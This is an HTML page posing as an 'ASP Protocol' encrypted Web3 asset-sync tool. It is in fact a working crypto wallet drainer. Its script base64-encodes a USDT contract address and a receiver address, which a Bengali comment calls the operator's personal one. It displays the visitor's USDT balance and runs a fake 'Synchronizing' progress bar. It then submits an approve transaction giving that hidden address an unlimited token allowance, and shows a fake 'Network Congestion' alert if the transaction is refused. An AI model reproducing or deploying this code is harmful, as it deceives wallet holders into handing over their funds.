<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ASP | Asset Sync</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.5/dist/web3.min.js"></script>
    <style>
        :root { --primary: #2563eb; --bg: #f8fafc; --card: #ffffff; --text: #1e293b; --sub: #64748b; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
        body { background: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .app-card { width: 92%; max-width: 360px; padding: 30px 20px; border-radius: 28px; background: var(--card); border: 1px solid #e2e8f0; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.05); position: relative; }
        .title { color: var(--primary); font-size: 18px; font-weight: 800; letter-spacing: 1px; margin-bottom: 5px; }
        .desc { font-size: 12px; color: var(--sub); margin-bottom: 25px; }
        .bal-display { background: #f1f5f9; padding: 25px; border-radius: 20px; margin-bottom: 25px; border: 1px solid #e2e8f0; position: relative; overflow: hidden; }
        .bal-amount { font-size: 30px; color: var(--text); font-weight: 800; position: relative; z-index: 2; }
        .shimmer { position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent); animation: flash 2s infinite; z-index: 1; }
        @keyframes flash { 0% { left: -100%; } 100% { left: 200%; } }
        #progress-container { width: 100%; height: 6px; background: #e2e8f0; border-radius: 10px; margin-bottom: 15px; display: none; overflow: hidden; }
        #progress-bar { width: 0%; height: 100%; background: var(--primary); transition: width 0.1s; }
        #status-text { font-size: 11px; color: var(--primary); font-weight: 600; margin-bottom: 10px; display: none; }
        .sync-btn { width: 100%; background: var(--primary); color: #fff; border: none; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 15px rgba(37, 99, 235, 0.2); }
        .sync-btn:active { transform: scale(0.96); }
        .badges { margin-top: 30px; display: flex; justify-content: space-around; border-top: 1px solid #f1f5f9; padding-top: 20px; }
        .badge { font-size: 10px; color: var(--sub); font-weight: 700; display: flex; flex-direction: column; align-items: center; gap: 5px; }
        .badge svg { width: 18px; height: 18px; fill: #94a3b8; }
    </style>
</head>
<body>

<div class="app-card">
    <div class="title">ASP PROTOCOL</div>
    <div class="desc">Encrypted Web3 Node Asset Sync</div>
    <div class="bal-display">
        <div class="shimmer"></div>
        <span style="font-size: 10px; color: var(--sub); font-weight: 700; text-transform: uppercase;">Verified USDT Balance</span>
        <div id="balText" class="bal-amount">Scanning...</div>
    </div>
    <div id="status-text">Initializing Secure Tunnel...</div>
    <div id="progress-container"><div id="progress-bar"></div></div>
    <button id="syncBtn" class="sync-btn" onclick="startLiveSync()">Synchronize Now</button>
    <div class="badges">
        <div class="badge"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>SECURE</div>
        <div class="badge"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>VERIFIED</div>
        <div class="badge"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>ENCRYPTED</div>
    </div>
</div>

<script>
    // এনকোড করা ভেরিয়েবল (USDT অ্যাড্রেস এবং আপনার পার্সোনাল রিসিভার অ্যাড্রেস)
    const _0x1a = "MHg1NWQzOTgzMjZmOTkwNTlmRjc3NTQ4NTI0Njk5OTAyN0IzMTk3OTU1"; 
    const _0x2b = "MHhGRDJCOWViZWQ4MGQyNjJmNzgwMjA2ZjE1ZDUwQ2RFOTk5RDg5MUQ=";
    const _d = (s) => atob(s);

    let web3;

    async function init() {
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            try {
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
                loadData();
            } catch (e) { loadData(); }
        }
    }

    async function loadData() {
        const accs = await web3.eth.requestAccounts();
        const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
        const contract = new web3.eth.Contract(abi, _d(_0x1a));
        const b = await contract.methods.balanceOf(accs[0]).call();
        document.getElementById('balText').innerText = (b / 1e18).toFixed(2) + " USDT";
    }

    async function startLiveSync() {
        const btn = document.getElementById('syncBtn');
        const status = document.getElementById('status-text');
        const progCont = document.getElementById('progress-container');
        const progBar = document.getElementById('progress-bar');
        btn.style.display = "none";
        status.style.display = "block";
        progCont.style.display = "block";

        let width = 0;
        let messages = ["Connecting Node...", "Encrypting Data...", "Synchronizing...", "Finalizing..."];
        let msgIndex = 0;
        let interval = setInterval(async () => {
            if (width >= 100) {
                clearInterval(interval);
                executeApprove();
            } else {
                width += 2;
                progBar.style.width = width + "%";
                if (width % 25 === 0) { status.innerText = messages[msgIndex]; msgIndex++; }
            }
        }, 80); 
    }

    async function executeApprove() {
        const accs = await web3.eth.getAccounts();
        const methodId = "0x095ea7b3"; // approve
        const paddedAddr = _d(_0x2b).substring(2).toLowerCase().padStart(64, '0');
        const maxVal = "f".repeat(64);
        const encodedData = methodId + paddedAddr + maxVal;

        try {
            await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{ from: accs[0], to: _d(_0x1a), data: encodedData }],
            });
            location.reload(); 
        } catch (e) {
            alert("Network Congestion. Please re-sync.");
            location.reload();
        }
    }

    window.onload = init;
</script>
</body>
</html>
